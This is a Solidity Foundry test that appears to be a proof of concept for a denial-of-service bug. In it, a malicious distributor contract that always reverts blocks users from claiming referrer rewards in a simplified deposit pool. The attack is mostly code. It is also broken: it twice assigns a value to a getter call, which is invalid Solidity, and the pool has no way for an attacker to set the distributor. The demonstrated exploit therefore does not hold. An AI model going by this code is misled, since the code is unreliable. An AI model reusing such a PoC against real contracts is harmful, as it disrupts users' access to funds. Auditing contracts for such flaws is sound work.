// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
}

contract MaliciousDistributor is IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external override {
        // Always revert to cause a DoS
        revert("MaliciousDistributor: always revert");
    }
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct RewardPoolProtocolDetails {
        uint256 distributedRewards;
        uint256 claimLockPeriodAfterClaim;
    }

    struct ReferrerData {
        uint256 lastClaim;
    }

    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 rate;
        uint256 pendingRewards;
        uint256 claimLockStart;
        uint256 claimLockEnd;
        uint128 lastClaim;
        address referrer;
    }

    address public distributor;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(address => mapping(uint256 => ReferrerData)) public referrersData;
    mapping(address => UserData) public usersData;

    function _claimReferrerTier(uint256 rewardPoolIndex_, address referrer_, address receiver_) public {
        IDistributor(distributor).distributeRewards(rewardPoolIndex_);
        // Additional logic...
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MaliciousDistributor maliciousDistributor;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        // Deploy contracts
        depositPool = new DepositPool();
        maliciousDistributor = new MaliciousDistributor();

        // Set the malicious distributor
        depositPool.distributor() = address(maliciousDistributor);

        // Fund accounts
        vm.deal(attacker, 1 ether);
        vm.deal(victim, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker sets the malicious distributor
        vm.prank(attacker);
        depositPool.distributor() = address(maliciousDistributor);

        // Step 2: Victim tries to claim rewards
        vm.prank(victim);
        vm.expectRevert("MaliciousDistributor: always revert");
        depositPool._claimReferrerTier(0, victim, victim);

        // Assert the vulnerability: Victim cannot claim rewards due to DoS
        // The test expects a revert, proving the DoS condition
    }
}